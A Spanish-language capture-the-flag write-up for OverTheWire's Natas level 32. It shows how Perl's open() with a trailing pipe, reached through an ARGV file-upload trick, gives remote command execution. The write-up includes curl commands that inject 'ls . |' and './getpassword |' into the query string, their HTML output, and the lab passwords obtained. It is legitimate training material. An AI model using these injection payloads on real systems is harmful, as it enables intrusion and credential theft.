# Natas 32

#### URL: http://natas32.natas.labs.overthewire.org/
#### Credenciales: natas32:NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B

Aunque en el [nivel anterior](https://github.com/Calana2/Writeups_es/blob/main/OverTheWire-Wargames/Natas/natas31.md) explotamos una vulnerabilidad de AFR, no mencionamos que esta era escalable a RCE

La funcion open() abre un descriptor de archivo a una ruta de archivo `a menos que un caracter "|" sea agregado al final de la cadena`. En ese caso open() `ejecutará el archivo`

![2025-03-21-153857_1366x768_scrot](https://github.com/user-attachments/assets/00f08b5f-5569-4959-bc4c-8bb481599e84)

```
curl -u natas32:NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B -F file=ARGV -F file=@file.csv -F submit=Upload "http://natas32.natas.labs.overthewire.org/index.pl?ls%20.%20|"
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<!-- Bootstrap -->
<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas32", "pass": "<censored>" };</script>
<script src="sorttable.js"></script>
</head>
<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>

<!--
    morla/10111
    shouts to Netanel Rubin
-->

<style>
#content {
    width: 900px;
}
.btn-file {
    position: relative;
    overflow: hidden;
}
.btn-file input[type=file] {
    position: absolute;
    top: 0;
    right: 0;
    min-width: 100%;
    min-height: 100%;
    font-size: 100px;
    text-align: right;
    filter: alpha(opacity=0);
    opacity: 0;
    outline: none;
    background: white;
    cursor: inherit;
    display: block;
}

</style>

<h1>natas32</h1>
<div id="content">
<table class="sortable table table-hover table-striped"><tr><th>.:
</th></tr><tr><td>bootstrap-3.3.6-dist
</td></tr><tr><td>getpassword
</td></tr><tr><td>index-source.html
</td></tr><tr><td>index.pl
</td></tr><tr><td>jquery-1.12.3.min.js
</td></tr><tr><td>sorttable.js
</td></tr><tr><td>tmp
</td></tr></table><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Encontramos un archivo 'getpassword', lo ejecutamos y conseguimos las credenciales:
```
curl -u natas32:NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B -F file=ARGV -F file=@file.csv -F submit=Upload "http://natas32.natas.labs.overthewire.org/index.pl?./getpassword%20|"
...
<h1>natas32</h1>
<div id="content">
<table class="sortable table table-hover table-striped"><tr><th>2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ
</th></tr></table><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

`natas33:2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ`

PD: The Perl Jam 2 --> https://www.youtube.com/watch?v=BYl3-c2JSL8

